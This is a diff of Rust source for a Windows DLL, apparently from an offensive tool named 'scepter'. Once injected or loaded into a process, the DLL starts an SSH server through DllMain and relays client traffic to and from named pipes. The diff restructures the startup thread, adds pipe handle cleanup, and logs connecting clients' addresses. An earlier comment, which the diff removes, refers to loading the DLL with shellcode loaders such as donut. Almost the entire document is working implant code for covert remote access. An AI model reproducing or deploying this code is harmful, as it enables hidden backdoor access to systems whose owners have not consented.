@@ -4,44 +4,30 @@
 
 use std::collections::HashMap;
 use std::os::raw::c_void;
-use windows_sys::Win32::Foundation::{BOOL, HANDLE};
+use std::ptr::null_mut;
+use windows_sys::Win32::Foundation::{BOOL, CloseHandle, HANDLE};
 
 use debug_print::{debug_eprintln, debug_println};
 use rand_core::OsRng;
 use russh::server::{Msg, Server as _, Session};
 use russh::*;
+use scepter_common::pipe::{initialize_input_pipe, initialize_output_pipe, write_output};
+pub use scepter_common::*;
 use std::sync::Arc;
 use std::thread;
 use tokio::runtime::Runtime;
 use tokio::sync::Mutex;
-
-pub use scepter_common::*;
+use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject, TerminateThread, GetCurrentThread};
 
 static mut G_H_INPUT_PIPE: HANDLE = 0 as HANDLE;
 static mut G_H_OUTPUT_PIPE: HANDLE = 0 as HANDLE;
 
-#[cfg(debug_assertions)]
-fn initialize_handles() -> (Option<HANDLE>, Option<HANDLE>) {
-    (Some(0 as HANDLE), Some(0 as HANDLE)) // Just so we pass the check in debug mode
-}
-#[cfg(not(debug_assertions))]
-fn initialize_handles() -> (Option<HANDLE>, Option<HANDLE>){
-    (pipe::initialize_input_pipe(), pipe::initialize_output_pipe())
-}
-
-// Call this from loaders like donut, otherwise ignore this
 #[unsafe(no_mangle)]
-pub unsafe extern "system" fn dll_start(){
-    // Initialize resources, etc.
-    let rt = tokio::runtime::Runtime::new().unwrap();
-
-    // Block on the async function
-    rt.block_on(dll_main());
-}
-
+#[tokio::main(flavor = "current_thread")]
 pub async fn dll_main() {
     debug_println!("Initialized handles");
     debug_println!("Starting server");
+
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
         auth_rejection_time: std::time::Duration::from_secs(10),
@@ -72,20 +58,24 @@ pub async fn dll_main() {
 
     // Create a new thread with its own tokio runtime
     thread::spawn(move || {
-
         debug_println!("Initializing handles");
 
-        let pipes = initialize_handles();
-
-        // Check if either pipe is None, and return early if so
-        if pipes.0.is_none() || pipes.1.is_none() {
-            debug_println!("Failed to initialize one or both pipes");
-            std::process::exit(1);
+        // Initialize output pipe
+        unsafe {
+            G_H_INPUT_PIPE = initialize_input_pipe().unwrap_or_else(|| {
+                debug_eprintln!("Failed to initialize input pipe.");
+                TerminateThread(GetCurrentThread(), 1);
+                0 as HANDLE // Rust silliness
+            });
         }
 
+        // Initialize output pipe
         unsafe {
-            G_H_INPUT_PIPE = pipes.0.unwrap();
-            G_H_OUTPUT_PIPE = pipes.1.unwrap();
+            G_H_OUTPUT_PIPE = initialize_output_pipe().unwrap_or_else(|| {
+                debug_eprintln!("Failed to initialize input pipe.");
+                TerminateThread(GetCurrentThread(), 1);
+                0 as HANDLE // Rust silliness
+            });
         }
 
         // Create a new tokio runtime for this thread
@@ -130,11 +120,11 @@ impl Server {
                 Ok(_) => {
                     debug_println!("Successfully sent to client {}", id);
                     id
-                },
+                }
                 Err(e) => {
                     debug_eprintln!("Failed to send to client {}: {:?}", id, e);
                     id
-                },
+                }
             };
         }
     }
@@ -156,7 +146,6 @@ impl Server {
                 self.post(CryptoVec::from(input)).await;
             }
         }
-
     }
 
     #[cfg(debug_assertions)]
@@ -182,13 +171,23 @@ impl Server {
 
 impl server::Server for Server {
     type Handler = Self;
-    fn new_client(&mut self, _: Option<std::net::SocketAddr>) -> Self {
+    fn new_client(&mut self, addr: Option<std::net::SocketAddr>) -> Self {
         let id = self.id;
         self.id += 1; // Increment ID for next client
 
         let mut s = self.clone();
         s.id = id; // Set this handler's ID
         debug_println!("New client connection with ID: {}", id);
+        unsafe {
+            if G_H_OUTPUT_PIPE != 0 as HANDLE && addr.is_some() {
+                let ip = addr.unwrap().ip().to_string();
+                let port = addr.unwrap().port();
+                write_output(
+                    G_H_OUTPUT_PIPE,
+                    &format!("Connection established {}:{}.\r\n", ip, port),
+                );
+            }
+        }
         s
     }
     fn handle_session_error(&mut self, _error: <Self::Handler as russh::server::Handler>::Error) {
@@ -270,7 +269,9 @@ impl server::Handler for Server {
         let output_data = String::from_utf8_lossy(data);
 
         debug_println!("Got data: {}", output_data);
-        unsafe { pipe::write_output(G_H_OUTPUT_PIPE, output_data.as_ref()); };
+        unsafe {
+            pipe::write_output(G_H_OUTPUT_PIPE, output_data.as_ref());
+        };
         Ok(())
     }
 }
@@ -278,11 +279,41 @@ impl server::Handler for Server {
 impl Drop for Server {
     fn drop(&mut self) {
         let id = self.id;
+
+        unsafe {
+            if G_H_OUTPUT_PIPE != 0 as HANDLE {
+                CloseHandle(G_H_OUTPUT_PIPE);
+            }
+            if G_H_INPUT_PIPE != 0 as HANDLE {
+                CloseHandle(G_H_INPUT_PIPE);
+            }
+        }
+
         let clients = self.clients.clone();
         tokio::spawn(async move {
             let mut clients = clients.lock().await;
             clients.remove(&id);
         });
+    }
+}
+
+unsafe extern "system" fn dll_main_caller(_param: *mut c_void) -> u32 {
+    dll_main();
+    0
+}
+#[unsafe(no_mangle)]
+pub unsafe extern "system" fn dll_start() {
+    // Create a new thread with its own tokio runtime
+    unsafe {
+        let h_thread = CreateThread(
+            null_mut(),
+            0,
+            Some(dll_main_caller),
+            null_mut(),
+            0,
+            null_mut(),
+        );
+        WaitForSingleObject(h_thread, INFINITE);
     }
 }
 
@@ -296,13 +327,8 @@ pub unsafe extern "system" fn DllMain(
 ) -> BOOL {
     match call_reason {
         DLL_PROCESS_ATTACH => {
-            // Code to run when the DLL is loaded into a process
-
             // Initialize resources, etc.
-            let rt = tokio::runtime::Runtime::new().unwrap();
-
-            // Block on the async function
-            rt.block_on(dll_main());
+            unsafe { dll_start() };
         }
         DLL_THREAD_ATTACH => {
             // Code to run when a new thread is created in the process
